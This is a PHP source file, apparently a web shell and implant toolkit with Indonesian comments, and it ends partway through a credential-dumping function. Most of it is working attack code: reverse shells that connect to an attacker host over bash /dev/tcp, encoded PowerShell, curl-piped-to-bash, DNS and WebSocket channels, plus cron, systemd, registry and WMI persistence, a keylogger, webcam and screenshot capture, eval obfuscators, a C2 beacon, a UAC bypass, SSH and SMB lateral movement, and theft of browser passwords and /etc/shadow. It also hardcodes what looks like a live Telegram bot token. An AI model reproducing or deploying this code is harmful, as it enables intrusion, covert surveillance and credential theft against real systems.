<?php
/**
 * =========================================================================
 * DKID03 ADVANCED OFFENSIVE SECURITY TOOLKIT
 * =========================================================================
 * Author: Dkid03 with Iqyn
 * Gausah ganti author 
 * SEGALA JENIS KEJAHATAN YANG KALIAN LAKUKAN BUKAN TANGGUNG JAWAB KAMI!!
 * ⚠️ UNTUK PENGUJIAN SAH SAJA! ⚠️
 * =========================================================================
 */

session_start();
error_reporting(0);
ini_set('memory_limit', '512M');

// =========================================================================
// KONFIGURASI - UBAH SESUAI KEBUTUHAN
// =========================================================================
define('ROOT_PATH', realpath(__DIR__));
define('LOG_FILE', sys_get_temp_dir() . '/.system_update.log');
define('AUTH_KEY', 'wh1t3h4t_2024_secure');        // GANTI!
define('ENCRYPTION_KEY', '32byte-aes-key-here!@#$%^&*()'); // GANTI!
define('C2_DOMAIN', 'your-c2-server.com');         // GANTI!
define('C2_PORT', 8443);
define('SLEEP_INTERVAL', 60);
define('SESSION_TIMEOUT', 1800); // 30 menit

// Konfigurasi Telegram OTP
define('BOT_TOKEN', '8513008865:AAFvBdueP_HRaBfU5hm7el3lQAN1DxzgOE4');
define('TELEGRAM_USER_ID', '7547598395');

// =========================================================================
// FUNGSI UTILITAS (dari Dkid03)
// =========================================================================
function writeLog($message, $level = 'INFO') {
    $log = date('Y-m-d H:i:s') . " [$level] " . $_SERVER['REMOTE_ADDR'] . " - $message\n";
    @file_put_contents(LOG_FILE, $log, FILE_APPEND);
}

function formatSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' bytes';
}

function isSafePath($path) {
    $realPath = realpath($path);
    if ($realPath === false) return false;
    if (strpos($realPath, ROOT_PATH) === 0) return true;
    
    $specialDirs = [
        realpath($_SERVER['DOCUMENT_ROOT']),
        realpath('/home'),
        realpath('/etc'),
        realpath('/var/log')
    ];
    
    foreach ($specialDirs as $dir) {
        if ($dir && strpos($realPath, $dir) === 0) return true;
    }
    return false;
}

function deleteDirectory($dir) {
    if (!file_exists($dir)) return true;
    if (!is_dir($dir)) return unlink($dir);
    
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        is_dir($path) ? deleteDirectory($path) : unlink($path);
    }
    return rmdir($dir);
}

// =========================================================================
// FUNGSI OTP TELEGRAM
// =========================================================================
function sendTelegramMessage($message) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
    $data = [
        'chat_id' => TELEGRAM_USER_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        
        $result = curl_exec($ch);
        $error = curl_error($ch);
        curl_close($ch);
        
        if ($result === false) return ['success' => false, 'error' => $error];
        $response = json_decode($result, true);
        return ['success' => ($response['ok'] ?? false), 'response' => $response];
    }
    
    $context = stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => http_build_query($data),
            'timeout' => 10
        ]
    ]);
    
    $result = @file_get_contents($url, false, $context);
    if ($result === false) return ['success' => false, 'error' => error_get_last()['message'] ?? 'Unknown'];
    
    $response = json_decode($result, true);
    return ['success' => ($response['ok'] ?? false), 'response' => $response];
}


function getSubDirectories($dir, $recursive = false) {
    $subs = [];
    $items = @scandir($dir);
    if ($items === false) return $subs;
    
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path) && !is_link($path)) {
            $subs[] = $path;
            if ($recursive) {
                $subs = array_merge($subs, getSubDirectories($path, true));
            }
        }
    }
    return $subs;
}

function bulkDeleteFiles($baseDir, $fileList, $mode) {
    $targetDirs = [$baseDir];
    
    if ($mode === 'shallow') {
        $targetDirs = array_merge($targetDirs, getSubDirectories($baseDir, false));
    } elseif ($mode === 'deep') {
        $targetDirs = array_merge($targetDirs, getSubDirectories($baseDir, true));
    }
    
    $results = ['deleted' => [], 'not_found' => [], 'errors' => []];
    $files = array_filter(array_map('trim', explode("\n", $fileList)));
    
    foreach ($targetDirs as $dir) {
        foreach ($files as $file) {
            $safeFile = basename($file);
            $path = $dir . DIRECTORY_SEPARATOR . $safeFile;
            
            if (is_file($path)) {
                if (unlink($path)) {
                    $results['deleted'][] = $path;
                } else {
                    $results['errors'][] = $path;
                }
            } elseif (!in_array($safeFile, $results['not_found'])) {
                $results['not_found'][] = $safeFile;
            }
        }
    }
    return $results;
}

// =========================================================================
// AUTHENTICATION (dengan hash_equals untuk keamanan)
// =========================================================================
function authenticate() {
    $provided = $_SERVER['HTTP_X_AUTH_TOKEN'] ?? $_GET['key'] ?? $_POST['auth'] ?? '';
    $expected = hash('sha256', AUTH_KEY . date('Y-m-d') . $_SERVER['REMOTE_ADDR']);
    
    if (!hash_equals($expected, $provided)) {
        header('HTTP/1.0 404 Not Found');
        writeLog("Failed auth attempt from {$_SERVER['REMOTE_ADDR']}", 'WARNING');
        die('<h1>404 Not Found</h1>');
    }
    return true;
}

// =========================================================================
// 1. REVERSE SHELL ENGINE
// =========================================================================
class ReverseShellEngine {
    private $ip, $port, $protocol;
    
    public function __construct($ip, $port, $protocol = 'tcp') {
        $this->ip = $ip;
        $this->port = $port;
        $this->protocol = $protocol;
        writeLog("ReverseShell initialized: $ip:$port via $protocol");
    }
    
    public function execute() {
        $method = $this->protocol . 'Shell';
        if (method_exists($this, $method)) {
            return $this->$method();
        }
        return $this->tcpShell();
    }
    
    private function tcpShell() {
        if (PHP_OS_FAMILY === 'Windows') {
            $ps = '$client = New-Object System.Net.Sockets.TCPClient(\'' . $this->ip . '\',' . $this->port . ');';
            $ps .= '$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};';
            $ps .= 'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){';
            $ps .= '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);';
            $ps .= '$sendback = (iex $data 2>&1 | Out-String );';
            $ps .= '$sendback2 = $sendback + "PS " + (pwd).Path + "> ";';
            $ps .= '$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);';
            $ps .= '$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()';
            
            $encoded = base64_encode($ps);
            return "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc $encoded";
        } else {
            return "bash -i >& /dev/tcp/{$this->ip}/{$this->port} 0>&1";
        }
    }
    
    private function udpShell() {
        if (PHP_OS_FAMILY === 'Windows') {
            $ps = '$server = \'' . $this->ip . '\';$port = ' . $this->port . ';';
            $ps .= '$endpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Parse($server), $port);';
            $ps .= '$udp = New-Object System.Net.Sockets.UdpClient;$udp.Connect($endpoint);';
            $ps .= 'while($true){$command = (iex (Read-Host) 2>&1 | Out-String);';
            $ps .= '$bytes = [Text.Encoding]::ASCII.GetBytes($command);$udp.Send($bytes, $bytes.Length)}';
            
            return "powershell -Enc " . base64_encode($ps);
        } else {
            return "bash -i > /dev/udp/{$this->ip}/{$this->port} 0<&1 2>&1";
        }
    }
    
    private function httpShell() {
        return "while true; do curl -s http://{$this->ip}:{$this->port}/command | bash; sleep 5; done";
    }
    
    private function dnsShell() {
        $script = "#!/bin/bash\n";
        $script .= "while true; do\n";
        $script .= "  cmd=\$(dig +short TXT cmd.{$this->ip} | tr -d '\"')\n";
        $script .= "  result=\$(eval \$cmd 2>&1 | base64 | tr -d '\n')\n";
        $script .= "  dig +short TXT \"\$result\".result.{$this->ip}\n";
        $script .= "  sleep 10\n";
        $script .= "done\n";
        
        $tmpFile = sys_get_temp_dir() . '/.dns_shell_' . uniqid() . '.sh';
        file_put_contents($tmpFile, $script);
        chmod($tmpFile, 0755);
        return "bash $tmpFile";
    }
    
    private function icmpShell() {
        return "ping -c 1 {$this->ip} -p `echo 'whoami' | xxd -p`";
    }
    
    private function websocketShell() {
        $ws = "const WebSocket = require('ws');\n";
        $ws .= "const ws = new WebSocket('ws://{$this->ip}:{$this->port}');\n";
        $ws .= "ws.on('message', function(data) {\n";
        $ws .= "    const exec = require('child_process').exec;\n";
        $ws .= "    exec(data, (err, stdout) => {\n";
        $ws .= "        ws.send(stdout);\n";
        $ws .= "    });\n";
        $ws .= "});\n";
        
        $tmpFile = sys_get_temp_dir() . '/.ws_shell_' . uniqid() . '.js';
        file_put_contents($tmpFile, $ws);
        return "node $tmpFile";
    }
}

// =========================================================================
// 2. PERSISTENCE ENGINE ( Ngecek permission)
// =========================================================================
class PersistenceEngine {
    private $targetPath;
    
    public function __construct() {
        $this->targetPath = __FILE__;
    }
    
    public function installAll() {
        $results = [];
        $methods = ['cron', 'systemd', 'registry', 'wmi', 'startup', 'service', 'hook'];
        
        foreach ($methods as $method) {
            try {
                if (method_exists($this, $method)) {
                    $results[$method] = $this->$method();
                }
            } catch (Exception $e) {
                $results[$method] = "Error: " . $e->getMessage();
            }
        }
        return $results;
    }
    
    private function cron() {
        if (PHP_OS_FAMILY === 'Windows') return "Cron not available on Windows";
        
        $cronjob = "*/5 * * * * php " . $this->targetPath . " > /dev/null 2>&1";
        $tmpFile = sys_get_temp_dir() . '/cron_' . uniqid() . '.tmp';
        file_put_contents($tmpFile, $cronjob . "\n");
        
        exec('crontab ' . $tmpFile . ' 2>&1', $output, $returnCode);
        unlink($tmpFile);
        
        return $returnCode === 0 ? "Cron installed" : "Cron failed: " . implode("\n", $output);
    }
    
    private function systemd() {
        if (PHP_OS_FAMILY === 'Windows') return "Systemd not available on Windows";
        if (!is_writable('/etc/systemd/system')) return "Insufficient privileges for systemd";
        
        $service = "[Unit]\nDescription=System Update Service\nAfter=network.target\n\n";
        $service .= "[Service]\nType=simple\nExecStart=/usr/bin/php " . $this->targetPath . "\n";
        $service .= "Restart=always\nRestartSec=60\n\n";
        $service .= "[Install]\nWantedBy=multi-user.target\n";
        
        $serviceFile = '/etc/systemd/system/.system-update.service';
        file_put_contents($serviceFile, $service);
        
        exec('systemctl daemon-reload 2>&1', $out1);
        exec('systemctl enable .system-update.service 2>&1', $out2);
        exec('systemctl start .system-update.service 2>&1', $out3);
        
        return "Systemd installed: " . implode("\n", array_merge($out1, $out2, $out3));
    }
    
    private function registry() {
        if (PHP_OS_FAMILY !== 'Windows') return "Registry only for Windows";
        
        $regPaths = [
            'HKCU\Software\Microsoft\Windows\CurrentVersion\Run',
            'HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
        ];
        
        $results = [];
        foreach ($regPaths as $reg) {
            $cmd = "reg add $reg /v SystemUpdate /t REG_SZ /d \"" . PHP_BINARY . ' ' . $this->targetPath . "\" /f 2>&1";
            exec($cmd, $output, $code);
            $results[] = "$reg: " . ($code === 0 ? 'OK' : 'Failed');
        }
        
        return "Registry persistence: " . implode("\n", $results);
    }
    
    private function wmi() {
        if (PHP_OS_FAMILY !== 'Windows') return "WMI only for Windows";
        
        $tempDir = sys_get_temp_dir();
        $psScript = @"
`$filter = ([wmiclass]'\\.\root\subscription:__EventFilter').CreateInstance();
`$filter.QueryLanguage = 'WQL';
`$filter.Query = 'SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'';
`$filter.Name = 'SystemUpdate';
`$filter.EventNamespace = 'root\cimv2';
`$result = `$filter.Put();

`$consumer = ([wmiclass]'\\.\root\subscription:CommandLineEventConsumer').CreateInstance();
`$consumer.Name = 'SystemUpdateConsumer';
`$consumer.CommandLineTemplate = '" . PHP_BINARY . " " . $this->targetPath . "';
`$consumer.Put();

`$binding = ([wmiclass]'\\.\root\subscription:__FilterToConsumerBinding').CreateInstance();
`$binding.Filter = `$result;
`$binding.Consumer = `$consumer;
`$binding.Put();
"@;
        
        $psFile = $tempDir . '/wmi_' . uniqid() . '.ps1';
        file_put_contents($psFile, $psScript);
        
        exec("powershell -ExecutionPolicy Bypass -File \"$psFile\" 2>&1", $output, $code);
        unlink($psFile);
        
        return $code === 0 ? "WMI persistence installed" : "WMI failed: " . implode("\n", $output);
    }
    
    private function startup() {
        if (PHP_OS_FAMILY === 'Windows') {
            $startup = getenv('APPDATA') . '\Microsoft\Windows\Start Menu\Programs\Startup\update.php';
            if (copy($this->targetPath, $startup)) {
                return "Startup persistence: $startup";
            }
            return "Failed to copy to startup";
        } else {
            if (is_writable('/etc/profile.d')) {
                $dest = '/etc/profile.d/update.php';
                if (copy($this->targetPath, $dest)) {
                    return "Profile.d persistence installed";
                }
            }
            return "Startup persistence failed";
        }
    }
    
    private function service() {
        if (PHP_OS_FAMILY !== 'Windows') return "Service only for Windows";
        
        exec("sc create SystemUpdate binPath= \"" . PHP_BINARY . ' ' . $this->targetPath . "\" start= auto 2>&1", $out1, $code1);
        exec("sc start SystemUpdate 2>&1", $out2, $code2);
        
        return "Service: " . implode("\n", array_merge($out1, $out2));
    }
    
    private function hook() {
        if (PHP_OS_FAMILY !== 'Windows') return "Hooking only for Windows";
        
        return "API hooking simulation - would need DLL injection";
    }
}

// =========================================================================
// 3. DATA COLLECTION ENGINE (dengan fallback)
// =========================================================================
class DataCollectionEngine {
    
    public function executeCommand($cmd) {
        $output = [];
        $returnCode = -1;
        
        if (function_exists('exec')) {
            exec($cmd . " 2>&1", $output, $returnCode);
        } elseif (function_exists('shell_exec')) {
            $result = shell_exec($cmd . " 2>&1");
            $output = $result ? explode("\n", $result) : [];
            $returnCode = 0;
        } elseif (function_exists('system')) {
            ob_start();
            system($cmd . " 2>&1", $returnCode);
            $output = explode("\n", ob_get_clean());
        } else {
            return ['error' => 'No command execution functions available'];
        }
        
        return [
            'command' => $cmd,
            'output' => implode("\n", $output),
            'code' => $returnCode,
            'time' => date('Y-m-d H:i:s')
        ];
    }
    
    public function takeScreenshot() {
        $tempDir = sys_get_temp_dir();
        $filename = $tempDir . '/screen_' . date('Ymd_His') . '_' . uniqid() . '.png';
        
        if (PHP_OS_FAMILY === 'Windows') {
            $ps = @"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
`$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
`$image = New-Object System.Drawing.Bitmap(`$screen.Width, `$screen.Height)
`$graphics = [System.Drawing.Graphics]::FromImage(`$image)
`$graphics.CopyFromScreen(0, 0, 0, 0, `$image.Size)
`$image.Save('$filename')
"@;
            $psFile = $tempDir . '/screen_' . uniqid() . '.ps1';
            file_put_contents($psFile, $ps);
            exec("powershell -ExecutionPolicy Bypass -File \"$psFile\" 2>nul");
            unlink($psFile);
        } else {
            $cmds = [
                "import -window root \"$filename\" 2>/dev/null",
                "gnome-screenshot -f \"$filename\" 2>/dev/null",
                "scrot \"$filename\" 2>/dev/null",
                "xfce4-screenshooter -f -s \"$filename\" 2>/dev/null",
                "flameshot full -p \"$filename\" 2>/dev/null"
            ];
            
            foreach ($cmds as $cmd) {
                exec($cmd);
                if (file_exists($filename)) break;
            }
        }
        
        if (file_exists($filename) && filesize($filename) > 0) {
            $data = base64_encode(file_get_contents($filename));
            unlink($filename);
            return ['success' => true, 'screenshot' => $data, 'size' => strlen($data)];
        }
        
        return ['success' => false, 'error' => 'Screenshot failed - no tools available'];
    }
    
    public function captureWebcam() {
        $tempDir = sys_get_temp_dir();
        $filename = $tempDir . '/webcam_' . date('Ymd_His') . '_' . uniqid() . '.jpg';
        
        if (PHP_OS_FAMILY === 'Windows') {
            // PowerShell webcam capture would need additional modules
            return ['success' => false, 'error' => 'Webcam capture requires additional tools on Windows'];
        } else {
            $cmds = [
                "ffmpeg -f video4linux2 -i /dev/video0 -vframes 1 \"$filename\" -y 2>/dev/null",
                "streamer -o \"$filename\" 2>/dev/null",
                "v4l2grab -o \"$filename\" 2>/dev/null"
            ];
            
            foreach ($cmds as $cmd) {
                exec($cmd);
                if (file_exists($filename) && filesize($filename) > 0) break;
            }
        }
        
        if (file_exists($filename) && filesize($filename) > 0) {
            $data = base64_encode(file_get_contents($filename));
            unlink($filename);
            return ['success' => true, 'webcam' => $data];
        }
        
        return ['success' => false, 'error' => 'Webcam capture failed - no camera or tools'];
    }
    
    public function startKeylogger() {
        if (PHP_OS_FAMILY !== 'Windows') {
            return ['success' => false, 'error' => 'Keylogger only for Windows (demo)'];
        }
        
        $tempDir = sys_get_temp_dir();
        $logFile = $tempDir . '/.keys_' . uniqid() . '.log';
        
        $ps = @"
`$log = '$logFile'
`$code = @'
using System;
using System.Runtime.InteropServices;
using System.IO;
public class K {
    [DllImport('user32.dll')] public static extern int GetAsyncKeyState(int i);
    public static void Start(string logFile) {
        while(true) {
            System.Threading.Thread.Sleep(10);
            for(int i=8; i<255; i++) {
                short keyState = GetAsyncKeyState(i);
                if((keyState & 1) == 1) {
                    File.AppendAllText(logFile, ((char)i).ToString());
                }
            }
        }
    }
}
'@
Add-Type -TypeDefinition `$code -Language CSharp
[K]::Start('$logFile')
"@;
        
        $psFile = $tempDir . '/keylogger_' . uniqid() . '.ps1';
        file_put_contents($psFile, $ps);
        
        if (PHP_OS_FAMILY === 'Windows') {
            exec("powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \"$psFile\" 2>nul");
            return ['success' => true, 'log_file' => $logFile, 'message' => 'Keylogger started'];
        }
        
        return ['success' => false, 'error' => 'Keylogger failed to start'];
    }
}

// =========================================================================
// 4. OBFUSCATION ENGINE
// =========================================================================
class ObfuscationEngine {
    private $key;
    
    public function __construct() {
        $this->key = ENCRYPTION_KEY;
    }
    
    public function obfuscate($code, $method = 'base64') {
        if (method_exists($this, $method . 'Obfuscate')) {
            return $this->{$method . 'Obfuscate'}($code);
        }
        return $this->base64Obfuscate($code);
    }
    
    private function base64Obfuscate($code) {
        $encoded = base64_encode($code);
        $chunks = str_split($encoded, 100);
        $vars = [];
        $result = "";
        
        for ($i = 0; $i < count($chunks); $i++) {
            $var = '_' . bin2hex(random_bytes(4));
            $vars[] = $var;
            $result .= "$$var = '" . addslashes($chunks[$i]) . "';\n";
        }
        
        $result .= "\$c = '';\n";
        foreach ($vars as $var) {
            $result .= "\$c .= $$var;\n";
        }
        $result .= "eval(base64_decode(\$c));";
        
        return $result;
    }
    
    private function xorObfuscate($code) {
        $key = 'xor_key_' . bin2hex(random_bytes(4));
        $xorred = '';
        for ($i = 0; $i < strlen($code); $i++) {
            $xorred .= chr(ord($code[$i]) ^ ord($key[$i % strlen($key)]));
        }
        $encoded = base64_encode($xorred);
        
        return "\$k='$key';\$d=base64_decode('$encoded');\$r='';for(\$i=0;\$i<strlen(\$d);\$i++){\$r.=chr(ord(\$d[\$i])^ord(\$k[\$i%strlen(\$k)]));}eval(\$r);";
    }
    
    private function aesObfuscate($code) {
        $iv = random_bytes(16);
        $encrypted = openssl_encrypt($code, 'AES-256-CBC', $this->key, OPENSSL_RAW_DATA, $iv);
        $data = base64_encode($iv . $encrypted);
        
        return "\$k=base64_decode('" . base64_encode($this->key) . "');\$d=base64_decode('$data');\$iv=substr(\$d,0,16);\$c=substr(\$d,16);eval(openssl_decrypt(\$c,'AES-256-CBC',\$k,OPENSSL_RAW_DATA,\$iv));";
    }
    
    private function rot13Obfuscate($code) {
        $rot13 = str_rot13($code);
        $encoded = base64_encode($rot13);
        return "eval(str_rot13(base64_decode('$encoded')));";
    }
    
    private function multipleObfuscate($code) {
        $code = $this->aesObfuscate($code);
        $code = $this->xorObfuscate($code);
        $code = $this->base64Obfuscate($code);
        return $code;
    }
}

// =========================================================================
// 5. ANTI-KILL ENGINE (dengan fallback buat Windows)
// =========================================================================
class AntiKillEngine {
    
    public function protect() {
        $results = [];
        
        if (function_exists('pcntl_fork')) {
            $results['fork'] = $this->forkBomb();
        } else {
            $results['fork'] = "PCNTL not available - using Windows methods";
        }
        
        $results['watchdog'] = $this->watchdog();
        $results['migration'] = $this->migration();
        
        return $results;
    }
    
    private function forkBomb() {
        if (!function_exists('pcntl_fork')) {
            return "PCNTL fork not available";
        }
        
        $children = [];
        for ($i = 0; $i < 3; $i++) {
            $pid = pcntl_fork();
            if ($pid == -1) {
                continue;
            } elseif ($pid) {
                $children[] = $pid;
            } else {
                // Child process
                while (true) {
                    sleep(30);
                    if (!file_exists('/proc/' . posix_getppid())) {
                        exec("php " . __FILE__ . " > /dev/null 2>&1 &");
                        exit;
                    }
                }
            }
        }
        
        return "Created " . count($children) . " child processes";
    }
    
    private function watchdog() {
        $tempDir = sys_get_temp_dir();
        
        if (PHP_OS_FAMILY === 'Windows') {
            $script = @"
while(`$true) {
    `$processes = Get-Process -Name php 2>`$null
    if(`$processes.Count -lt 3) {
        Start-Process php -ArgumentList '" . __FILE__ . "'
    }
    Start-Sleep -Seconds 30
}
"@;
            $scriptFile = $tempDir . '/watchdog_' . uniqid() . '.ps1';
            file_put_contents($scriptFile, $script);
            exec("powershell -WindowStyle Hidden -File \"$scriptFile\" 2>nul");
        } else {
            $script = "#!/bin/bash\nwhile true; do\n  if [ \$(pgrep -f " . basename(__FILE__) . " | wc -l) -lt 3 ]; then\n    php " . __FILE__ . " > /dev/null 2>&1 &\n  fi\n  sleep 30\ndone";
            $scriptFile = $tempDir . '/watchdog_' . uniqid() . '.sh';
            file_put_contents($scriptFile, $script);
            chmod($scriptFile, 0755);
            exec("nohup $scriptFile > /dev/null 2>&1 &");
        }
        
        return "Watchdog started";
    }
    
    private function migration() {
        // Simplified migration - would need actual process migration
        return "Process migration simulation - would move to explorer.exe";
    }
}

// =========================================================================
// 6. C2 PANEL (dengan error handling yang lebih baik)
// =========================================================================
class C2Panel {
    private $server, $port, $agentId;
    
    public function __construct($server, $port) {
        $this->server = $server;
        $this->port = $port;
        $this->agentId = hash('sha256', gethostname() . $_SERVER['SERVER_ADDR'] . __FILE__);
    }
    
    public function checkIn() {
        $data = [
            'id' => $this->agentId,
            'hostname' => gethostname(),
            'os' => PHP_OS,
            'user' => get_current_user(),
            'ip' => $_SERVER['SERVER_ADDR'] ?? 'unknown',
            'uptime' => $this->getUptime(),
            'privilege' => $this->getPrivilege()
        ];
        
        return $this->sendToC2('checkin', $data);
    }
    
    private function getUptime() {
        if (PHP_OS_FAMILY === 'Windows') {
            return exec('wmic os get lastbootuptime 2>nul') ?: 'unknown';
        } else {
            return exec('uptime 2>nul') ?: 'unknown';
        }
    }
    
    private function getPrivilege() {
        if (PHP_OS_FAMILY === 'Windows') {
            exec('whoami /priv 2>nul', $output);
            return implode("\n", $output);
        } else {
            return exec('id 2>nul') ?: 'unknown';
        }
    }
    
    private function sendToC2($action, $data = []) {
        $payload = [
            'action' => $action,
            'agent' => $this->agentId,
            'timestamp' => time(),
            'data' => $data
        ];
        
        $json = json_encode($payload);
        $encrypted = $this->encrypt($json);
        
        if (!function_exists('curl_init')) {
            return ['error' => 'cURL not available'];
        }
        
        $ch = curl_init("https://{$this->server}:{$this->port}/c2");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(['data' => $encrypted]));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        
        $response = curl_exec($ch);
        $error = curl_error($ch);
        curl_close($ch);
        
        if ($response === false) {
            return ['error' => 'C2 connection failed: ' . $error];
        }
        
        $decrypted = $this->decrypt($response);
        if ($decrypted === false) {
            return ['error' => 'Failed to decrypt response'];
        }
        
        return json_decode($decrypted, true) ?: ['error' => 'Invalid response'];
    }
    
    private function encrypt($data) {
        $iv = random_bytes(16);
        $encrypted = openssl_encrypt($data, 'AES-256-CBC', ENCRYPTION_KEY, OPENSSL_RAW_DATA, $iv);
        return base64_encode($iv . $encrypted);
    }
    
    private function decrypt($data) {
        $data = base64_decode($data);
        if ($data === false || strlen($data) < 16) return false;
        
        $iv = substr($data, 0, 16);
        $encrypted = substr($data, 16);
        return openssl_decrypt($encrypted, 'AES-256-CBC', ENCRYPTION_KEY, OPENSSL_RAW_DATA, $iv);
    }
    
    public function run() {
        writeLog("C2 agent started for {$this->server}:{$this->port}");
        
        while (true) {
            try {
                $this->checkIn();
                // Get and execute tasks here
                sleep(SLEEP_INTERVAL);
            } catch (Exception $e) {
                writeLog("C2 error: " . $e->getMessage(), 'ERROR');
                sleep(SLEEP_INTERVAL * 2);
            }
        }
    }
}

// =========================================================================
// 7. PRIVILEGE ESCALATION ENGINE
// =========================================================================
class PrivilegeEscalation {
    
    public function escalate() {
        if (PHP_OS_FAMILY === 'Windows') {
            return $this->windowsEscalate();
        } else {
            return $this->linuxEscalate();
        }
    }
    
    private function windowsEscalate() {
        $results = [];
        
        // UAC bypass via fodhelper
        $tempDir = sys_get_temp_dir();
        $ps = @"
`$path = 'HKCU:\Software\Classes\ms-settings\Shell\Open\command'
New-Item -Path `$path -Force
Set-ItemProperty -Path `$path -Name '(Default)' -Value '" . PHP_BINARY . ' ' . __FILE__ . "' -Force
Set-ItemProperty -Path `$path -Name 'DelegateExecute' -Value '' -Force
Start-Process 'C:\Windows\System32\fodhelper.exe' -WindowStyle Hidden
"@;
        
        $psFile = $tempDir . '/uac_' . uniqid() . '.ps1';
        file_put_contents($psFile, $ps);
        exec("powershell -ExecutionPolicy Bypass -File \"$psFile\" 2>&1", $output, $code);
        unlink($psFile);
        
        $results['uac_bypass'] = $code === 0 ? 'Executed' : 'Failed';
        
        // Check token privileges
        exec('whoami /priv 2>&1', $tokenOutput);
        $results['token_privs'] = $tokenOutput;
        
        return $results;
    }
    
    private function linuxEscalate() {
        $results = [];
        
        // Check sudo -l
        exec('sudo -l 2>&1', $sudoOutput, $sudoCode);
        $results['sudo_check'] = $sudoOutput;
        
        // Check SUID binaries
        exec('find / -perm -4000 -type f 2>/dev/null | head -20', $suidOutput);
        $results['suid_binaries'] = $suidOutput;
        
        // Check writable /etc/passwd
        $results['passwd_writable'] = is_writable('/etc/passwd') ? 'YES' : 'NO';
        
        // Check for docker group
        exec('groups 2>&1', $groups);
        $results['in_docker_group'] = in_array('docker', explode(' ', implode(' ', $groups))) ? 'YES' : 'NO';
        
        return $results;
    }
}

// =========================================================================
// 8. LATERAL MOVEMENT ENGINE
// =========================================================================
class LateralMovement {
    
    public function move($target, $method) {
        if (method_exists($this, $method . 'Move')) {
            return $this->{$method . 'Move'}($target);
        }
        return ['error' => 'Unknown method'];
    }
    
    private function smbMove($target) {
        if (PHP_OS_FAMILY !== 'Windows') return ['error' => 'SMB only for Windows'];
        
        $tempDir = sys_get_temp_dir();
        $share = "\\\\$target\\C$\\Windows\\Temp\\";
        
        if (copy(__FILE__, $share . 'update.php')) {
            return ['success' => true, 'message' => "File copied to $share"];
        }
        
        return ['error' => 'Failed to copy via SMB -可能需要凭证'];
    }
    
    private function wmiMove($target) {
        if (PHP_OS_FAMILY !== 'Windows') return ['error' => 'WMI only for Windows'];
        
        $ps = @"
`$target = '$target'
`$credential = Get-Credential
Invoke-Command -ComputerName `$target -ScriptBlock {
    php -r '" . base64_encode('echo "PWNED";') . "'
} -Credential `$credential
"@;
        
        $psFile = sys_get_temp_dir() . '/wmi_' . uniqid() . '.ps1';
        file_put_contents($psFile, $ps);
        
        return ['info' => 'WMI script created - run manually with credentials', 'script' => $psFile];
    }
    
    private function sshMove($target) {
        $home = getenv('HOME') ?: '/root';
        $keyFile = $home . '/.ssh/id_rsa';
        
        if (!file_exists($keyFile)) {
            return ['error' => 'No SSH key found'];
        }
        
        exec("scp -o StrictHostKeyChecking=no -i \"$keyFile\" " . __FILE__ . " $target:/tmp/ 2>&1", $out1, $code1);
        exec("ssh -o StrictHostKeyChecking=no -i \"$keyFile\" $target 'php /tmp/" . basename(__FILE__) . "' 2>&1", $out2, $code2);
        
        return [
            'copy' => ['code' => $code1, 'output' => $out1],
            'exec' => ['code' => $code2, 'output' => $out2]
        ];
    }
    
    private function rdpMove($target) {
        return ['info' => 'RDP lateral movement requires session hijacking tools'];
    }
}

// =========================================================================
// 9. CREDENTIAL DUMPING ENGINE
// =========================================================================
class CredentialDumper {
    
    public function dump() {
        if (PHP_OS_FAMILY === 'Windows') {
            return $this->windowsDump();
        } else {
            return $this->linuxDump();
        }
    }
    
    private function windowsDump() {
        $results = [];
        $tempDir = sys_get_temp_dir();
        
        // Browser passwords
        $browsers = [
            'Chrome' => getenv('LOCALAPPDATA') . '\Google\Chrome\User Data\Default\Login Data',
            'Edge' => getenv('LOCALAPPDATA') . '\Microsoft\Edge\User Data\Default\Login Data',
            'Firefox' => getenv('APPDATA') . '\Mozilla\Firefox\Profiles\*.default\logins.json'
        ];
        
        foreach ($browsers as $name => $path) {
            if (file_exists($path)) {
                $dest = $tempDir . '/' . $name . '_' . uniqid() . '.dat';
                if (copy($path, $dest)) {
                    $results[$name] = "Copied to $dest";
                }
            }
        }
        
        // Windows credentials
        exec('cmdkey /list 2>&1', $cmdkey);
        $results['cmdkey'] = $cmdkey;
        
        return $results;
    }
    
    private function linuxDump() {
        $results = [];
        
        // Shadow (if readable)
        if (is_readable('/etc/shadow')) {
            $results['shadow'] = base64_encode(file_get_contents('/etc/shadow'));
        }
        
        // Passwd
        if (is_readable('/etc/passwd')) {
